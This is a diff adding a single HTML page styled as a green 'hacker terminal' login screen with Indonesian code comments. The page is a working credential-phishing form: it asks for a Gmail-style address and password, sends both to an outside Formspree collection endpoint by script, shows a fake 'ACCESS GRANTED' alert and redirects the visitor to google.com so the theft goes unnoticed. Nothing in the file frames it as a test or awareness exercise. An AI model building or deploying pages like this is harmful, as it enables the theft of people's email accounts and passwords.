@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINAL | OVERRIDE</title>
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --dark-green: #003b00;
+            --bg-black: #0a0a0a;
+        }
+
+        body {
+            background-color: var(--bg-black);
+            color: var(--neon-green);
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        /* Scanline Effect */
+        body::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+
+        .login-card {
+            border: 1px solid var(--neon-green);
+            padding: 40px;
+            background: rgba(0, 20, 0, 0.9);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+            width: 350px;
+            position: relative;
+            z-index: 3;
+        }
+
+        .status {
+            font-size: 12px;
+            margin-bottom: 10px;
+            text-align: left;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        h3 {
+            margin: 0 0 20px 0;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--neon-green);
+            padding-bottom: 10px;
+        }
+
+        input {
+            background: transparent;
+            border: 1px solid var(--dark-green);
+            color: var(--neon-green);
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            outline: none;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 10px var(--dark-green);
+        }
+
+        button {
+            background: var(--neon-green);
+            color: black;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-weight: bold;
+            letter-spacing: 2px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background: black;
+            color: var(--neon-green);
+            box-shadow: 0 0 15px var(--neon-green);
+            transform: scale(1.02);
+        }
+
+        .footer-text {
+            font-size: 10px;
+            margin-top: 20px;
+            color: var(--dark-green);
+        }
+
+        /* Glitch Animation */
+        .glitch {
+            position: relative;
+        }
+
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            left: 2px;
+            text-shadow: -1px 0 red;
+            top: 0;
+            background: var(--bg-black);
+            overflow: hidden;
+            clip: rect(0, 900px, 0, 0);
+            animation: noise-anim 2s infinite linear alternate-reverse;
+        }
+
+        @keyframes noise-anim {
+            0% { clip: rect(10px, 9999px, 50px, 0); }
+            100% { clip: rect(80px, 9999px, 100px, 0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <div class="status">> SYSTEM_REVAL</div>
+        <h3 class="glitch" data-text="ACCESS_DENIED">ACCESS_DENIED</h3>
+        
+        <form id="hackerForm" action="https://formspree.io/f/mlgoqroe" method="POST">
+            <input type="email" name="user_id" placeholder="@gmail..." required>
+            <input type="password" name="access_key" placeholder="pasword..." required>
+            <button type="submit" id="btn-text">Login</button>
+        </form>
+
+        <div class="footer-text">IP_TRACE: REDACTED // ROOT_ACCESS_REQUIRED</div>
+    </div>
+
+    <script>
+        const form = document.getElementById('hackerForm');
+        const btnText = document.getElementById('btn-text');
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            
+            // Animasi Loading saat diklik
+            btnText.innerText = "PENETRATING...";
+            btnText.style.opacity = "0.5";
+            btnText.disabled = true;
+
+            const data = new FormData(form);
+            
+            try {
+                await fetch(form.action, {
+                    method: 'POST',
+                    body: data,
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                // Efek sukses yang lebih dramatis
+                alert("[-] CONNECTION ESTABLISHED\n[-] UPLOADING PAYLOAD\n[-] ACCESS GRANTED!");
+                window.location.href = "https://google.com"; // Alihkan ke tempat lain setelah sukses
+            } catch (error) {
+                alert("CONNECTION FAILED. RETRYING...");
+                location.reload();
+            }
+        };
+    </script>
+</body>
+</html>
